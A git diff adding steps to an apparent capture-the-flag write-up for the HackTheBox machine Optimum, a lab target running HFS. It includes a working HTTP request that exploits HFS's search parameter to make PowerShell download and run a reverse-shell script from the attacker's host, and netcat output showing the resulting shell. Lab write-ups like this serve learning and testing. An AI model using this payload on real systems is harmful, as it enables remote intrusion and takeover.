@@ -242,6 +242,18 @@ Upgrade-Insecure-Requests: 1
 
 ![ping](images/ping.PNG)
 
+- correct output
+
+```bash
+04:45:05.679357 IP 10.10.10.8 > 10.10.14.12: ICMP echo request, id 1, seq 7, length 40
+04:45:05.679387 IP 10.10.14.12 > 10.10.10.8: ICMP echo reply, id 1, seq 7, length 40
+04:45:05.679400 IP 10.10.10.8 > 10.10.14.12: ICMP echo request, id 1, seq 8, length 40
+04:45:05.679404 IP 10.10.14.12 > 10.10.10.8: ICMP echo reply, id 1, seq 8, length 40
+04:45:06.690718 IP 10.10.10.8 > 10.10.14.12: ICMP echo request, id 1, seq 9, length 40
+04:45:06.690794 IP 10.10.14.12 > 10.10.10.8: ICMP 
+```
+
+
 
 __Executing shellcode__
 
@@ -260,3 +272,38 @@ Upgrade-Insecure-Requests: 1
 ```
 
  and it worked.. now download the script into the target machine
+
+- setup the listener and send the request
+- request + payload
+
+```javascript
+GET /?search=%00{.exec |c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12:8000/Invoke-PowerShellTcp.ps1')  .} HTTP/1.1
+Host: 10.10.10.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.10.8/
+Cookie: HFS_SID=0.0326641160063446
+Upgrade-Insecure-Requests: 1
+```
+
+> make sure to invoke the script with in the script file with IP and port
+
+
+__Result__
+
+```bash
+$ nc -lvnp  9001                                                                           130 ⨯
+listening on [any] 9001 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.10.8] 49162
+Windows PowerShell running as user kostas on OPTIMUM
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\kostas\Desktop>whoami
+optimum\kostas
+PS C:\Users\kostas\Desktop> 
+
+```
+
